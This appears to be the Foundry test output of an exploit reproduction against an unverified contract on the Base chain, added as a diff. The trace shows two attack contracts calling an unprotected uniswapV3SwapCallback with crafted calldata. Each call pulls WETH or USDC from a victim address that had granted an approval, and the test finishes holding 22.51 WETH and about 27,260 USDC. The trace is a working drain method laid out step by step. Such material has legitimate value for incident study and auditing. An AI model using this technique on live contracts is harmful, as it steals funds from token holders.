@@ -1,0 +1,88 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Unverified_6077_exp.sol:Unverified_6077_exp
+[PASS] testExploit() (gas: 1012310)
+Logs:
+  WETH: 22.510000000000000000
+  USDC: 27260.020000
+
+Traces:
+  [12174] Unverified_6077_exp::setUp()
+    ├─ [0] VM::createSelectFork("base", 28791089 [2.879e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(WETH: [0x4200000000000000000000000000000000000006], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDC: [0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913], "USDC")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1052110] Unverified_6077_exp::testExploit()
+    ├─ [417192] → new AttackContract@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Return] 1973 bytes of code
+    ├─ [73258] AttackContract::start()
+    │   ├─ [41381] 0x607742A2Adea4037020e11Bb67CB98E289E3eC7D::uniswapV3SwapCallback(-125859570852398 [-1.258e14], 22510000000000000000 [2.251e19], 0x000000000000000000000000ddddf3d84a1e94036138cab7ff35d003c1207a7700000000000000000000000000000000000000000000000000005ad023c7e400)
+    │   │   ├─ [380] AttackContract::token1() [staticcall]
+    │   │   │   └─ ← [Return] WETH: [0x4200000000000000000000000000000000000006]
+    │   │   ├─ [35400] WETH::transferFrom(0xddddF3D84a1E94036138Cab7ff35d003c1207A77, AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 22510000000000000000 [2.251e19])
+    │   │   │   ├─ emit Transfer(from: 0xddddF3D84a1E94036138Cab7ff35d003c1207A77, to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 22510000000000000000 [2.251e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd75dd81462b72a4b7fc17a574647a45672e0ce24238ba8c01608714724d11b28: 0x000000000000000000000000000000000000000000000001387c7f4fddf95998 → 0x0000000000000000000000000000000000000000000000000018e99337ee5998
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x000000000000000000000000000000000000000000000001386395bca60b0000
+    │   │   │   │   @ 0x3d13bb3a58a9b8a901fe247f31bce317022329b83b1f6f1c4b98e42c9e072845: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0x0000000000000000000000000000000000000000000000043363c870bd050000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [457] WETH::balanceOf(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 22510000000000000000 [2.251e19]
+    │   ├─ [24901] WETH::transfer(Unverified_6077_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22510000000000000000 [2.251e19])
+    │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Unverified_6077_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 22510000000000000000 [2.251e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x000000000000000000000000000000000000000000000001386395bca60b0000 → 0
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x000000000000000000000000000000000000000000000001386395bca60b0000
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [416392] → new AttackContract2@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Return] 1969 bytes of code
+    ├─ [69841] AttackContract2::start()
+    │   ├─ [54409] 0x607742A2Adea4037020e11Bb67CB98E289E3eC7D::uniswapV3SwapCallback(-125859570852398 [-1.258e14], 27260000000 [2.726e10], 0x000000000000000000000000ddddf3d84a1e94036138cab7ff35d003c1207a7700000000000000000000000000000000000000000000000000005ad023c7e400)
+    │   │   ├─ [380] AttackContract2::token1() [staticcall]
+    │   │   │   └─ ← [Return] USDC: [0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913]
+    │   │   ├─ [48428] USDC::transferFrom(0xddddF3D84a1E94036138Cab7ff35d003c1207A77, AttackContract2: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 27260000000 [2.726e10])
+    │   │   │   ├─ [41254] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::transferFrom(0xddddF3D84a1E94036138Cab7ff35d003c1207A77, AttackContract2: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 27260000000 [2.726e10]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0xddddF3D84a1E94036138Cab7ff35d003c1207A77, to: AttackContract2: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], value: 27260000000 [2.726e10])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xbd5c3a9f15f95343999354bec7f8f601e482dac399fd51c681aee3a57338c4d0: 0x0000000000000000000000000000000000000000000000000000000658da526e → 506734
+    │   │   │   │   │   @ 0xa8d71ca060038c614781f365f7b0b7c0eafa93d29ed882ba0cd03147e829b40d: 0 → 0x0000000000000000000000000000000000000000000000000000000658d29700
+    │   │   │   │   │   @ 0x8c71ab62852cbdea9b04c50872f19a6436f8f1e5718c58a25b6b6b7c8214b3b0: 0x0000000000000000000000000000000000000000000000056bc75e2898db050a → 0x0000000000000000000000000000000000000000000000056bc75e2240086e0a
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [1250] USDC::balanceOf(AttackContract2: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(AttackContract2: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [delegatecall]
+    │   │   │   └─ ← [Return] 27260000000 [2.726e10]
+    │   │   └─ ← [Return] 27260000000 [2.726e10]
+    │   ├─ [10163] USDC::transfer(Unverified_6077_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 27260000000 [2.726e10])
+    │   │   ├─ [9463] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::transfer(Unverified_6077_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 27260000000 [2.726e10]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: AttackContract2: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: Unverified_6077_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 27260000000 [2.726e10])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 20000 → 0x0000000000000000000000000000000000000000000000000000000658d2e520
+    │   │   │   │   @ 0xa8d71ca060038c614781f365f7b0b7c0eafa93d29ed882ba0cd03147e829b40d: 0x0000000000000000000000000000000000000000000000000000000658d29700 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [457] WETH::balanceOf(Unverified_6077_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 22510000000000000000 [2.251e19]
+    ├─ emit log_named_decimal_uint(key: "WETH", val: 22510000000000000000 [2.251e19], decimals: 18)
+    ├─ [1250] USDC::balanceOf(Unverified_6077_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(Unverified_6077_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 27260020000 [2.726e10]
+    │   └─ ← [Return] 27260020000 [2.726e10]
+    ├─ emit log_named_decimal_uint(key: "USDC", val: 27260020000 [2.726e10], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.00s (4.16s CPU time)
+
+Ran 1 test suite in 6.24s (5.00s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
